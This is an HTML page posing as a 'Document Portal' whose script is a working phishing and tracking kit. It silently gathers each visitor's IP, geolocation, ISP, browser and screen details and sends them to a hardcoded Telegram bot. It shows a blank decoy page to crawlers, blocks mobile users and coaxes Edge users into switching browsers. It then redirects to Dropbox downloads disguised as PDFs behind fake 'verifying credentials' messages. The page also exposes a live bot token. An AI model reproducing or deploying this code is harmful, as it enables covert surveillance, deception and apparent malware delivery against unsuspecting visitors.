<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Document Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid #e9ecef;
        }
        .icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h2 {
            color: #1a1e2b;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        p {
            color: #6c757d;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        .loader {
            width: 36px;
            height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status {
            color: #6c757d;
            font-size: 13px;
            margin: 16px 0;
        }
        .manual-link {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }
        .manual-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #adb5bd;
        }
        .message-card {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            max-width: 500px;
            margin: 0 auto;
        }
        .message-card .card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 40px;
            border: 1px solid #e9ecef;
        }
        .message-card .icon-large {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .message-card h2 {
            color: #1a1e2b;
            margin-bottom: 16px;
        }
        .message-card p {
            color: #6c757d;
            margin: 16px 0;
        }
        .permission-buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin: 24px 0;
        }
        .permission-btn {
            display: inline-block;
            padding: 12px 28px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            text-align: center;
        }
        .permission-btn.chrome {
            background: #4285f4;
        }
        .permission-btn.firefox {
            background: #ff9400;
        }
        .permission-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }
        .permission-btn.disabled, .permission-btn:disabled {
            background: #adb5bd;
            cursor: not-allowed;
            transform: none;
        }
        .browser-status {
            font-size: 13px;
            margin-top: 8px;
            font-weight: 500;
        }
        .install-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }
        .install-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 12px;
        }
        .install-links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        .install-links a:hover {
            text-decoration: underline;
        }
        .instruction-note {
            background: #f0f2f5;
            padding: 12px;
            border-radius: 8px;
            margin: 20px 0 0;
            font-size: 13px;
            color: #495057;
        }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        // ============================================================
        // TELEGRAM CONFIGURATION
        // ============================================================
        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
        const TELEGRAM_CHAT_ID = '1482823538';
        
        // ============================================================
        // YOUR DROPBOX LINKS (UPDATED – CLEAN .PDF EXTENSIONS)
        // ============================================================
        const FILE_LINKS = [
            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
        ];
        
        // ============================================================
        // TELEGRAM NOTIFICATION FUNCTION
        // ============================================================
        async function sendTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram send failed:', error);
                return false;
            }
        }
        
        // ============================================================
        // GET IP AND LOCATION
        // ============================================================
        async function getLocationInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();
                
                return {
                    ip: ip,
                    city: locationData.city || 'Unknown',
                    region: locationData.region || 'Unknown',
                    country: locationData.country_name || 'Unknown',
                    latitude: locationData.latitude || 'N/A',
                    longitude: locationData.longitude || 'N/A',
                    isp: locationData.org || 'Unknown',
                    timezone: locationData.timezone || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    latitude: 'N/A',
                    longitude: 'N/A',
                    isp: 'Unknown',
                    timezone: 'Unknown'
                };
            }
        }
        
        // ============================================================
        // SEND VISIT NOTIFICATION
        // ============================================================
        async function sendVisitNotification(selectedFile, browserName, action = 'view') {
            const location = await getLocationInfo();
            const userAgent = navigator.userAgent;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const referrer = document.referrer || 'Direct';
            const timestamp = new Date().toISOString();
            const fileName = selectedFile.split('/').pop().split('?')[0];
            
            const message = `🔵 <b>DOCUMENT ACCESS</b> 🔵
            
📍 <b>Location:</b> ${location.city}, ${location.region}, ${location.country}
🌐 <b>IP Address:</b> ${location.ip}
🗺️ <b>Coordinates:</b> ${location.latitude}, ${location.longitude}
🏢 <b>ISP:</b> ${location.isp}
⏰ <b>Timezone:</b> ${location.timezone}

📁 <b>File:</b> ${fileName}
💻 <b>OS:</b> ${navigator.platform}
🌍 <b>Browser:</b> ${browserName}
🔄 <b>Action:</b> ${action}
🖥️ <b>Screen:</b> ${screenSize}
🔗 <b>Referrer:</b> ${referrer}
📅 <b>Time:</b> ${timestamp}

<b>User Agent:</b>
<code>${userAgent.substring(0, 200)}</code>`;
            
            await sendTelegram(message);
        }
        
        // ============================================================
        // BROWSER DETECTION
        // ============================================================
        function detectBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.indexOf('edg') > -1 || ua.indexOf('edge') > -1) return 'Microsoft Edge';
            if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1) return 'Chrome';
            if (ua.indexOf('firefox') > -1) return 'Firefox';
            if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
            return 'Unknown';
        }
        
        // ============================================================
        // CHECK IF BROWSER IS INSTALLED (via protocol detection)
        // ============================================================
        function isBrowserInstalled(protocol, callback) {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            let timeout = setTimeout(() => {
                document.body.removeChild(iframe);
                callback(false);
            }, 2000);
            
            iframe.onload = function() {
                clearTimeout(timeout);
                document.body.removeChild(iframe);
                callback(true);
            };
            
            iframe.src = protocol + '://test';
        }
        
        // ============================================================
        // OPEN IN BROWSER WITH FALLBACK
        // ============================================================
        function openInBrowser(browser, url, browserName, buttonElement) {
            // Disable button temporarily
            buttonElement.disabled = true;
            buttonElement.textContent = 'Opening...';
            
            // Show loading status
            const statusDiv = document.getElementById(`${browser}Status`);
            if (statusDiv) {
                statusDiv.innerHTML = '⏳ Attempting to open...';
                statusDiv.style.color = '#ff9400';
            }
            
            // Try to open with custom protocol
            window.location.href = `${browser}://${url.replace(/^https?:\/\//, '')}`;
            
            // Copy link to clipboard as fallback
            navigator.clipboard.writeText(url);
            
            // Show success/instruction message
            setTimeout(() => {
                if (statusDiv) {
                    statusDiv.innerHTML = '✅ Link copied to clipboard. If the browser didn\'t open, paste it manually.';
                    statusDiv.style.color = '#28a745';
                }
                
                // Send Telegram notification
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', `opened_in_${browserName}`);
                
                // Reset button after 3 seconds
                setTimeout(() => {
                    buttonElement.disabled = false;
                    buttonElement.textContent = `Open in ${browserName.charAt(0).toUpperCase() + browserName.slice(1)}`;
                    if (statusDiv) statusDiv.innerHTML = '';
                }, 3000);
                
                // Close current tab after short delay
                setTimeout(() => window.close(), 2000);
            }, 500);
        }
        
        // ============================================================
        // ASK TO OPEN IN CHROME/FIREFOX
        // ============================================================
        function askToOpenInOtherBrowser(currentUrl) {
            // Create modal
            const modal = document.createElement('div');
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
            `;
            
            const dialog = document.createElement('div');
            dialog.style.cssText = `
                background: white;
                max-width: 500px;
                width: 90%;
                padding: 30px;
                border-radius: 24px;
                text-align: center;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                max-height: 90vh;
                overflow-y: auto;
            `;
            
            dialog.innerHTML = `
                <div style="font-size: 48px; margin-bottom: 16px;">🌐</div>
                <h2 style="margin-bottom: 12px;">Switch Browser</h2>
                <p style="color: #6c757d; margin-bottom: 20px;">
                    This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
                </p>
                
                <div class="permission-buttons">
                    <button id="chromeBtn" class="permission-btn chrome">Open in Chrome</button>
                    <button id="firefoxBtn" class="permission-btn firefox">Open in Firefox</button>
                </div>
                
                <div id="chromeStatus" class="browser-status"></div>
                <div id="firefoxStatus" class="browser-status"></div>
                
                <div class="install-section">
                    <p style="font-size: 14px; color: #6c757d; margin-bottom: 8px;">
                        <strong>Don't have Chrome or Firefox?</strong>
                    </p>
                    <div class="install-links">
                        <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
                        <a href="https://www.mozilla.org/firefox/" target="_blank">⬇️ Download Firefox</a>
                    </div>
                    <p style="font-size: 12px; color: #6c757d; margin-top: 12px;">
                        After installing, <strong>copy this link</strong> and paste it into the new browser:
                    </p>
                    <div style="background: #f0f2f5; padding: 8px; border-radius: 6px; margin-top: 8px; word-break: break-all; font-size: 12px; font-family: monospace;">
                        ${currentUrl}
                    </div>
                </div>
                
                <div class="instruction-note">
                    💡 <strong>Tip:</strong> After installing Chrome/Firefox, click the button above to open the document.
                    If it doesn't work, the link will be copied to your clipboard automatically.
                </div>
                
                <button id="cancelBtn" style="margin-top: 24px; background: none; border: none; color: #6c757d; cursor: pointer; font-size: 14px; text-decoration: underline;">
                    Stay in Edge (not recommended)
                </button>
            `;
            
            modal.appendChild(dialog);
            document.body.appendChild(modal);
            
            // Check Chrome installation
            isBrowserInstalled('googlechrome', (chromeInstalled) => {
                const chromeBtn = document.getElementById('chromeBtn');
                const chromeStatus = document.getElementById('chromeStatus');
                if (!chromeInstalled) {
                    chromeBtn.classList.add('disabled');
                    chromeStatus.innerHTML = '⚠️ Chrome not detected. Download it above.';
                    chromeStatus.style.color = '#dc3545';
                } else {
                    chromeStatus.innerHTML = '✅ Chrome is installed';
                    chromeStatus.style.color = '#28a745';
                }
            });
            
            // Check Firefox installation
            isBrowserInstalled('firefox', (firefoxInstalled) => {
                const firefoxBtn = document.getElementById('firefoxBtn');
                const firefoxStatus = document.getElementById('firefoxStatus');
                if (!firefoxInstalled) {
                    firefoxBtn.classList.add('disabled');
                    firefoxStatus.innerHTML = '⚠️ Firefox not detected. Download it above.';
                    firefoxStatus.style.color = '#dc3545';
                } else {
                    firefoxStatus.innerHTML = '✅ Firefox is installed';
                    firefoxStatus.style.color = '#28a745';
                }
            });
            
            // Chrome button click
            document.getElementById('chromeBtn').onclick = (e) => {
                e.preventDefault();
                const chromeBtn = document.getElementById('chromeBtn');
                openInBrowser('googlechrome', currentUrl, 'chrome', chromeBtn);
            };
            
            // Firefox button click
            document.getElementById('firefoxBtn').onclick = (e) => {
                e.preventDefault();
                const firefoxBtn = document.getElementById('firefoxBtn');
                openInBrowser('firefox', currentUrl, 'firefox', firefoxBtn);
            };
            
            // Cancel button
            document.getElementById('cancelBtn').onclick = () => {
                modal.remove();
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
            };
        }
        
        // ============================================================
        // USERAGENT DETECTION
        // ============================================================
        (async function() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
            const isWindows = /windows|win32|win64/i.test(ua);
            const browser = detectBrowser();
            const currentUrl = window.location.href;
            
            // BOT DETECTION
            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
            if (isBot) {
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">📄</div>
                        <h2>Document Portal</h2>
                        <p>Secure document delivery system.</p>
                        <div class="footer">Secure Transmission</div>
                    </div>
                `;
                return;
            }
            
            // MOBILE BLOCK
            if (isMobile) {
                document.getElementById('app').innerHTML = `
                    <div class="message-card">
                        <div class="card">
                            <div class="icon-large">📱</div>
                            <h2>Desktop Access Required</h2>
                            <p>This document requires a desktop environment.</p>
                            <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
                            <hr style="margin: 24px 0 16px; border: none; border-top: 1px solid #e9ecef;">
                            <p style="font-size: 11px; color: #adb5bd;">Secure Document Portal</p>
                        </div>
                    </div>
                `;
                return;
            }
            
            // EDGE – ASK TO SWITCH BROWSER
            if (browser === 'Microsoft Edge') {
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
                askToOpenInOtherBrowser(currentUrl);
                return;
            }
            
            // CHROME/FIREFOX – SHOW LOADING AND REDIRECT
            document.getElementById('app').innerHTML = `
                <div class="container">
                    <div class="icon">📄</div>
                    <h2>Document Portal</h2>
                    <p>Your document is being prepared</p>
                    <div class="loader"></div>
                    <div class="status" id="status">Verifying access...</div>
                    <div class="manual-link" id="manualLink">
                        <a href="#" id="manualUrl">Click here if not redirected</a>
                    </div>
                    <div class="footer">Secure • Encrypted</div>
                </div>
            `;
            
            function getRandomFile() {
                const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
                let hash = 0;
                for (let i = 0; i < fingerprint.length; i++) {
                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
                    hash |= 0;
                }
                return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
            }
            
            const selectedFile = getRandomFile();
            sendVisitNotification(selectedFile, browser, 'access_granted');
            
            if (!sessionStorage.getItem('redirected')) {
                sessionStorage.setItem('redirected', 'true');
                
                const delay = 1500 + Math.random() * 2000;
                const messages = ['Verifying credentials', 'Loading document', 'Preparing download', 'Redirecting...'];
                let idx = 0;
                const statusEl = document.getElementById('status');
                const interval = setInterval(() => {
                    if (statusEl) {
                        idx = (idx + 1) % messages.length;
                        statusEl.innerHTML = messages[idx];
                    }
                }, 800);
                
                setTimeout(() => {
                    clearInterval(interval);
                    window.location.href = selectedFile;
                }, delay);
                
                setTimeout(() => {
                    const manualLink = document.getElementById('manualLink');
                    const manualUrl = document.getElementById('manualUrl');
                    if (manualLink && manualUrl) {
                        manualLink.style.display = 'block';
                        manualUrl.href = selectedFile;
                        const loader = document.querySelector('.loader');
                        if (loader) loader.style.display = 'none';
                        if (statusEl) statusEl.innerHTML = 'Click to download';
                    }
                }, 5000);
            } else {
                const loader = document.querySelector('.loader');
                const statusEl = document.getElementById('status');
                if (loader) loader.style.display = 'none';
                if (statusEl) statusEl.innerHTML = 'Document ready';
                document.getElementById('manualLink').style.display = 'block';
                document.getElementById('manualUrl').href = selectedFile;
            }
        })();
    </script>
</body>
</html>
